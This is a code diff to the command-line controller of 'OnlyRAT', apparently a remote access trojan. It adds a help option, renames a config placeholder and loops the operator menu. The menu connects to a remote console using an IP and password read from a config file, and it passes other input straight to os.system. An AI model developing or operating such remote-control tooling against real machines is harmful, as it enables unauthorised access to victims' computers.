@@ -10,7 +10,7 @@ from modules import *
 
 # banner for display
 banner = """
-     ::::::::  ::::    ::: :::     :::   ::: :::::::::      ::: ::::::::::: 
+      ::::::::  ::::    ::: :::     :::   ::: :::::::::      ::: ::::::::::: 
     :+:    :+: :+:+:   :+: :+:     :+:   :+: :+:    :+:   :+: :+:   :+:      
    +:+    +:+ :+:+:+  +:+ +:+      +:+ +:+  +:+    +:+  +:+   +:+  +:+       
   +#+    +:+ +#+ +:+ +#+ +#+       +#++:   +#++:++#:  +#++:++#++: +#+        
@@ -25,7 +25,7 @@ banner = """
 # help menu
 help_menu = """
         [+] Arguments:
-            XXX.rat = configuration file 
+            <username>.rat = configuration file 
 
         [+] Example:
             onlyrat bluecosmo.rat
@@ -37,6 +37,7 @@ options_menu = """
             [0] - Remote Console
 
         [+] Options:
+            [h] - Help Menu
             [u] - Update OnlyRAT
             [r] - Remove OnlyRAT
             [q] - Quit
@@ -144,41 +145,52 @@ def cli(arguments):
         # display options
         print(options_menu)
 
-        # user input, option
-        option = input(header)
+        # loop user input
+        while True:
 
-        # check if configuration file exists
-        try:
-            configuration = read_config(sys.argv[1])
-    
-        except FileNotFoundError: 
-            print("\n[!!] File does not exist")
-            exit()
+            # user input, option
+            option = input(header)
 
-        # get config info
-        ipv4 = configuration.get("IPADDRESS")
-        password = configuration.get("PASSWORD")
-        working_direcory = configuration.get("WORKINGDIRECTORY")
-
-        # remote console
-        if option == "0":
-            connect(ipv4, password)        
+            # check if configuration file exists
+            try:
+                configuration = read_config(sys.argv[1])
         
-        # update option
-        elif option == "u" or option == "update":
-            update()
+            except FileNotFoundError: 
+                print("\n[!!] File does not exist")
+                exit()
 
-        # remove installation
-        elif option == "r" or option == "remove" or option == "uninstall":
-            remove()
+            # get config info
+            ipv4 = configuration.get("IPADDRESS")
+            password = configuration.get("PASSWORD")
+            working_direcory = configuration.get("WORKINGDIRECTORY")
 
-        # quit option
-        elif option == "q" or option == "quit" or option == "exit":
-            exit()
+            # remote console
+            if option == "0":
+                connect(ipv4, password)
 
-        # exception
-        else:
-            os.system(option)
+            # help menu
+            elif option == "h" or option == "help":
+                main()
+            
+            # update option
+            elif option == "u" or option == "update":
+                update()
+
+            # remove installation
+            elif option == "r" or option == "remove" or option == "uninstall":
+                remove()
+
+            # quit option
+            elif option == "q" or option == "quit" or option == "exit":
+                exit()
+
+
+            # exception
+            else:
+                os.system(option)
+            
+            # new line for cleaner UI
+            print("\n")
 
     # if arguments don't exist
     else:
